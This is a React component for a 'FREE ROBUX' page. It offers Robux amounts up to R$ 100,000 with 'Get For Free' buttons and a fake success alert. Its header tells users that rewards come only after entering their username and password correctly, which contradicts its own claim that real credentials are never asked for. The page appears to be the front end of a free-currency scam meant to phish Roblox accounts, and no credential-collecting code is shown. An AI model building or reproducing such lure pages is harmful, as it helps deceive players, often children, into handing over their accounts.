
import './Dashboard.css';

export default function Dashboard() {
  const plans = [
    { price: 'R$ 500', },
    { price: 'R$ 1,000', },
    { price: 'R$ 2,000', },
     { price: 'R$ 500', },
    { price: 'R$ 1,000', },
    { price: 'R$ 2,000', },
    
     { price: 'R$ 2,500', },
    { price: 'R$ 3,000', },
    { price: 'R$ 3,500', },
     { price: 'R$ 4,000', },
    { price: 'R$ 4,500', },
    { price: 'R$ 5,000', },
     { price: 'R$ 5,500', },
    { price: 'R$ 6,000', },
    { price: 'R$ 6,500', },
     { price: 'R$ 100,000', },
     
    
    
    
    
    
  ];

  return (
    
    <div className="premium-container">
      <div className="premium-header">
        <h1>FREE ROBUX</h1>
        <p>
Security note: free Robux is issued only after a successful login. Make sure your username and password are entered correctly. We never ask for or store real Roblox credentials.
        </p>
      </div>

      <div className="plans">
        {plans.map((plan, index) => (
          <div key={index} className={`plan-card ${plan.highlight ? 'highlight' : ''}`}>
            <h2><span className="price-symbol">R$</span> {plan.price.replace('R$', '').trim()}</h2>

            <p className="robux">{plan.robux}CLAIM YOUR REWARD</p>
           <button onClick={() => alert('🎉 Congrats! You successfully got free Robux!')} className="buy-button">
  Get For Free
</button>

          </div>
        ))}
      </div>
       
       

      <div className="features">
        <h3>Even more Features</h3>
        <ul>
          <li>Get more Free GIFT CARDS</li>
          <li>Sell More — Resell items and get more Robux selling your creations</li>
          <li>Trade — Trade items with other Premium members</li>
        </ul>
      </div>
      <h1>Developed by: Godwinn Gallego</h1>
    </div>
  );
}
